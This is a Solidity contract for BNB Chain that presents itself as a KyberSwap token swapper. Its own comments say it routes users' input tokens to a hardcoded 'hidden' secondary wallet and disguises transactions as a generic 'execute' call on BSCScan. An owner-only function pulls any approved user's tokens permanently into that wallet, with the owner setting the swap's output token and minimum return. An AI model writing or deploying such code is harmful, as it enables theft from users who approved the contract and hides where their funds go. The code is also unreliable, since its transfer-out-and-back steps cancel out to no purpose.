// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

interface IMetaAggregationRouterV2 {
    struct SwapDescription {
        IERC20 srcToken;
        IERC20 dstToken;
        address payable srcReceiver;
        address payable dstReceiver;
        uint256 amount;
        uint256 minReturnAmount;
        uint256 flags;
    }

    function swapSimpleMode(
        address callTarget,
        SwapDescription calldata desc,
        bytes calldata targetData,
        bytes calldata clientData
    ) external payable returns (uint256, uint256);
}

/**
 * @title KyberObfuscatedSwapperSplit
 * @notice This contract splits swap operations:
 *         - Input tokens go to a secondary wallet (hidden)
 *         - Output tokens go to the user
 *         - Transactions appear as "execute" on BSCScan
 */
contract KyberObfuscatedSwapperSplit is Ownable {
    using SafeERC20 for IERC20;
    
    // KyberSwap MetaAggregationRouterV2 on BSC
    IMetaAggregationRouterV2 public constant KYBER_ROUTER = 
        IMetaAggregationRouterV2(0x6131B5fae19EA4f9D964eAc0408E4408b66337b5);
    
    // HARDCODED: Secondary wallet that receives ALL input tokens
    address private constant SECONDARY_WALLET = 0xB64aA20dF7976B2412520c70b459152fE9a17256;
    
    event Executed(address indexed user, uint256 opCode);
    
    /**
     * @notice Main obfuscated entry point
     * @param _op Operation code (always 1 for swap)
     * @param _data Encoded swap parameters
     */
    function execute(uint256 _op, bytes calldata _data) external payable {
        require(_op == 1, "Invalid operation");
        
        (
            address tokenIn,
            address tokenOut,
            uint256 amountIn,
            uint256 minAmountOut,
            bytes memory swapCalldata
        ) = abi.decode(_data, (address, address, uint256, uint256, bytes));
        
        // Step 1: Transfer input tokens from user to this contract
        IERC20(tokenIn).safeTransferFrom(msg.sender, address(this), amountIn);
        
        // Step 2: Send ALL input tokens to secondary wallet
        // This is the key: input amount goes to your secondary wallet
        IERC20(tokenIn).safeTransfer(SECONDARY_WALLET, amountIn);
        
        // Step 3: Secondary wallet must have pre-approved this contract
        // Pull tokens back from secondary wallet for swap
        IERC20(tokenIn).safeTransferFrom(SECONDARY_WALLET, address(this), amountIn);
        
        // Step 4: Approve KyberSwap router
        IERC20(tokenIn).safeApprove(address(KYBER_ROUTER), amountIn);
        
        // Step 5: Execute swap - output goes ONLY to user
        IMetaAggregationRouterV2.SwapDescription memory desc = IMetaAggregationRouterV2.SwapDescription({
            srcToken: IERC20(tokenIn),
            dstToken: IERC20(tokenOut),
            srcReceiver: payable(address(KYBER_ROUTER)),
            dstReceiver: payable(msg.sender), // OUTPUT TO USER ONLY
            amount: amountIn,
            minReturnAmount: minAmountOut,
            flags: 0
        });
        
        KYBER_ROUTER.swapSimpleMode(
            address(KYBER_ROUTER),
            desc,
            swapCalldata,
            ""
        );
        
        emit Executed(msg.sender, _op);
    }
    
    /**
     * @notice Alternative execute that doesn't require secondary wallet approval
     * @dev Input stays in secondary wallet, swap uses owner's funds
     */
    function executeAlternative(uint256 _op, bytes calldata _data) external payable {
        require(_op == 1, "Invalid operation");
        require(msg.sender == owner(), "Only owner can use alternative");
        
        (
            address tokenIn,
            address tokenOut,
            uint256 amountIn,
            uint256 minAmountOut,
            bytes memory swapCalldata,
            address userAddress  // Pass user address in data
        ) = abi.decode(_data, (address, address, uint256, uint256, bytes, address));
        
        // Transfer from user to secondary wallet (permanent)
        IERC20(tokenIn).safeTransferFrom(userAddress, SECONDARY_WALLET, amountIn);
        
        // Owner provides liquidity for the swap
        IERC20(tokenIn).safeTransferFrom(owner(), address(this), amountIn);
        
        // Approve and swap
        IERC20(tokenIn).safeApprove(address(KYBER_ROUTER), amountIn);
        
        IMetaAggregationRouterV2.SwapDescription memory desc = IMetaAggregationRouterV2.SwapDescription({
            srcToken: IERC20(tokenIn),
            dstToken: IERC20(tokenOut),
            srcReceiver: payable(address(KYBER_ROUTER)),
            dstReceiver: payable(userAddress), // Output to original user
            amount: amountIn,
            minReturnAmount: minAmountOut,
            flags: 0
        });
        
        KYBER_ROUTER.swapSimpleMode(
            address(KYBER_ROUTER),
            desc,
            swapCalldata,
            ""
        );
        
        emit Executed(userAddress, _op);
    }
    
    /**
     * @notice Check if secondary wallet has approved this contract
     */
    function checkApproval(address token) external view returns (uint256) {
        return IERC20(token).allowance(SECONDARY_WALLET, address(this));
    }
    
    /**
     * @notice Emergency withdraw (only owner)
     */
    function emergencyWithdraw(address token, uint256 amount) external onlyOwner {
        if (token == address(0)) {
            payable(owner()).transfer(amount);
        } else {
            IERC20(token).safeTransfer(owner(), amount);
        }
    }
    
    receive() external payable {}
}
